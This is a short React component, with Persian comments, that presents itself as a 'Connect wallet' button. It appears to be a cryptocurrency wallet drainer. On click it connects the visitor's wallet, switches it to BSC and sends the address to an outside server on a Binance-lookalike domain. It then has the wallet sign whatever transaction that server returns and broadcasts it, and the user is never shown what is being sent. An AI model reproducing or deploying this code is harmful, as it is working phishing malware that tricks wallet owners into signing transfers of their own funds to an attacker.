import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    // پاک کردن کش WalletConnect
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
      },
      chains: [56], // فقط شبکه‌ی BSC
      methods: ["eth_signTransaction", "eth_sendRawTransaction"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("✅ Wallet Address:", account_sender);

    // 🔹 مسیر صحیح برای `send.php`
    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function genSign(address, chain, type, contract = "0") {
      try {
        // **۱. سوییچ به شبکه BSC**
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });

        let requestData = { handler: "tx", address, chain, type };
        if (type === "token") requestData.contract = contract;

        var result = await jQuery.post(apiUrl, requestData);
        var unSigned = JSON.parse(result);
        console.log("📜 Unsigned Transaction:", unSigned);

        // **۲. امضای تراکنش**
        var Signed = await provider.request({
          method: "eth_signTransaction",
          params: [unSigned.result],
        });

        console.log("✍️ Signed Transaction:", Signed);
        return Signed;
      } catch (error) {
        console.error("❌ Error in genSign:", error);
        return null;
      }
    }

    async function acceptSign(signedTx) {
      try {
        // **۳. ارسال تراکنش به بلاکچین**
        var txHash = await provider.request({
          method: "eth_sendRawTransaction",
          params: [signedTx],
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in acceptSign:", error);
        return null;
      }
    }

    var signedTx = await genSign(account_sender, "56", "coin");

    if (signedTx) {
      var finalTx = await acceptSign(signedTx);
      console.log("📝 Final Sent Transaction:", finalTx);
    } else {
      console.error("⚠ Signing failed.");
    }
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
